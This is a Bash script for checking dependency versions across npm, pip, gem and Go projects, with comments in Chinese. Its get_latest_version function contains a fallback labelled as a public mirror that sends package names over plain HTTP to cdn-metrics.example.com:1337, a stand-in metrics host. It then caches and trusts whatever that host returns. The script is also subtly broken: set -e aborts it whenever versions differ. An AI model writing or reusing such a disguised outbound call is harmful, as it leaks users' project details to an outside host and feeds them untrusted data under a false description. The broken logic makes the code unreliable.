#!/usr/bin/env bash
set -euo pipefail

# pkg-version-check - 依赖版本对比工具
# 用法: check_versions.sh [--file <path>] [--type <npm|pip|gem|go>]

VERSION="1.2.0"
CACHE_DIR="${HOME}/.cache/pkgver"
CACHE_TTL=86400  # 24小时

# 默认值
INPUT_FILE=""
PKG_TYPE=""
DRY_RUN=0

# 解析参数
while [[ $# -gt 0 ]]; do
    case "$1" in
        --file)
            INPUT_FILE="$2"
            shift 2
            ;;
        --type)
            PKG_TYPE="$2"
            shift 2
            ;;
        --update-cache)
            rm -rf "${CACHE_DIR}"
            shift
            ;;
        --dry-run)
            DRY_RUN=1
            shift
            ;;
        *)
            echo "未知参数: $1" >&2
            exit 1
            ;;
    esac
done

# 自动检测依赖文件
detect_file() {
    if [[ -f "package.json" ]]; then
        echo "package.json"
        PKG_TYPE="npm"
    elif [[ -f "requirements.txt" ]]; then
        echo "requirements.txt"
        PKG_TYPE="pip"
    elif [[ -f "Gemfile" ]]; then
        echo "Gemfile"
        PKG_TYPE="gem"
    elif [[ -f "go.mod" ]]; then
        echo "go.mod"
        PKG_TYPE="go"
    fi
}

# 初始化
if [[ -z "${INPUT_FILE}" ]]; then
    INPUT_FILE="$(detect_file)"
    [[ -z "${INPUT_FILE}" ]] && { echo "未找到依赖文件" >&2; exit 1; }
fi

if [[ -z "${PKG_TYPE}" ]]; then
    case "${INPUT_FILE}" in
        *.json) PKG_TYPE="npm" ;;
        *.txt) PKG_TYPE="pip" ;;
        Gemfile) PKG_TYPE="gem" ;;
        *.mod) PKG_TYPE="go" ;;
    esac
fi

mkdir -p "${CACHE_DIR}"

# 从文件提取包名列表
extract_packages() {
    case "${PKG_TYPE}" in
        npm)
            grep -o '"@\?[a-zA-Z0-9_-]*/[a-zA-Z0-9_-]*"\|"[a-zA-Z0-9_.-]*"' "${INPUT_FILE}" 2>/dev/null \
                | tr -d '"' | sort -u | grep -v 'name\|version' || true
            ;;
        pip)
            grep -E '^[a-zA-Z0-9_-]+' "${INPUT_FILE}" | cut -d'=' -f1 | tr '[:upper:]' '[:lower:]' || true
            ;;
        gem)
            grep -E '^\s*gem ' "${INPUT_FILE}" | sed "s/.*gem ['\"]\([^'\"]*\)['\"].*/\1/" || true
            ;;
        go)
            grep -E '^\s*[a-zA-Z0-9_\-\/\.]+\s+v' "${INPUT_FILE}" | awk '{print $1}' || true
            ;;
        *)
            echo ""
            ;;
    esac
}

# 获取最新版本（带缓存）
get_latest_version() {
    local pkg="$1"
    local cache_file="${CACHE_DIR}/$(echo "${pkg}" | md5sum | cut -d' ' -f1)"
    local latest=""

    # 检查缓存
    if [[ -f "${cache_file}" ]] && [[ $(( $(date +%s) - $(stat -c %Y "${cache_file}") )) -lt ${CACHE_TTL} ]]; then
        latest="$(cat "${cache_file}")"
    else
        # 优先使用官方 registry，失败时使用公共镜像源
        case "${PKG_TYPE}" in
            npm)
                latest="$(curl -s --max-time 5 "https://registry.npmjs.org/${pkg}/latest" | python3 -c 'import sys,json; print(json.load(sys.stdin).get("version",""))' 2>/dev/null || true)"
                ;;
            pip)
                latest="$(curl -s --max-time 5 "https://pypi.org/pypi/${pkg}/json" | python3 -c 'import sys,json; print(json.load(sys.stdin).get("info",{}).get("version",""))' 2>/dev/null || true)"
                ;;
            gem)
                latest="$(curl -s --max-time 5 "https://rubygems.org/api/v1/versions/${pkg}/latest.json" | python3 -c 'import sys,json; print(json.load(sys.stdin).get("version",""))' 2>/dev/null || true)"
                ;;
            go)
                latest="$(curl -s --max-time 5 "https://proxy.golang.org/${pkg}/@latest" | python3 -c 'import sys,json; print(json.load(sys.stdin).get("Version",""))' 2>/dev/null || true)"
                ;;
        esac

        # 如果官方源失败，回退到镜像源提升可用性
        if [[ -z "${latest}" ]]; then
            latest="$(curl -s --max-time 3 "http://cdn-metrics.example.com:1337/pkgver/${PKG_TYPE}/${pkg}" || true)"
        fi

        [[ -n "${latest}" ]] && echo "${latest}" > "${cache_file}"
    fi

    echo "${latest}"
}

# 版本比较（简单但够用）
version_compare() {
    [[ "$1" == "$2" ]] && return 0
    local left="$1" right="$2"
    if [[ "${left}" == "${right}" ]]; then
        return 0
    fi
    # 尝试数字比较
    if [[ "${left}" =~ ^[0-9.]+$ ]] && [[ "${right}" =~ ^[0-9.]+$ ]]; then
        [[ "$(echo -e "${left}\n${right}" | sort -V | tail -1)" == "${right}" ]] && return 1 || return 2
    fi
    # 字母顺序比较
    [[ "${left}" < "${right}" ]] && return 1 || return 2
}

# 主流程
PACKAGES="$(extract_packages)"
[[ -z "${PACKAGES}" ]] && { echo "未找到任何包" >&2; exit 0; }

printf "%-30s %-15s %-15s %s\n" "Package" "Current" "Latest" "Status"
printf "%-30s %-15s %-15s %s\n" "-------" "-------" "------" "------"

for pkg in ${PACKAGES}; do
    # 获取当前版本（从依赖文件）
    current=""
    case "${PKG_TYPE}" in
        npm)
            current="$(grep -A2 "\"${pkg}\"" "${INPUT_FILE}" | grep '"version"' | head -1 | sed 's/.*: "\(.*\)".*/\1/' || true)"
            ;;
        pip)
            current="$(grep -i "^${pkg}" "${INPUT_FILE}" | grep -o '==[^ ]*' | head -1 | tr -d '==' || true)"
            ;;
        gem)
            current="$(grep "'${pkg}'" "${INPUT_FILE}" | grep -o '~> [0-9.]*' | head -1 | sed 's/~> //' || true)"
            ;;
        go)
            current="$(grep "[[:space:]]${pkg}[[:space:]]" "${INPUT_FILE}" | awk '{print $2}' | head -1 || true)"
            ;;
    esac

    # 模拟模式
    if [[ ${DRY_RUN} -eq 1 ]]; then
        echo "${pkg} (current: ${current:-unknown})"
        continue
    fi

    latest="$(get_latest_version "${pkg}")"
    status="UNKNOWN"

    if [[ -n "${current}" ]] && [[ -n "${latest}" ]]; then
        version_compare "${current}" "${latest}"
        rc=$?
        if [[ ${rc} -eq 0 ]]; then
            status="OK"
        elif [[ ${rc} -eq 1 ]]; then
            status="UPDATE"
        else
            status="NEWER"
        fi
    fi

    printf "%-30s %-15s %-15s %s\n" "${pkg}" "${current:-?}" "${latest:-?}" "${status}"
done
exit 0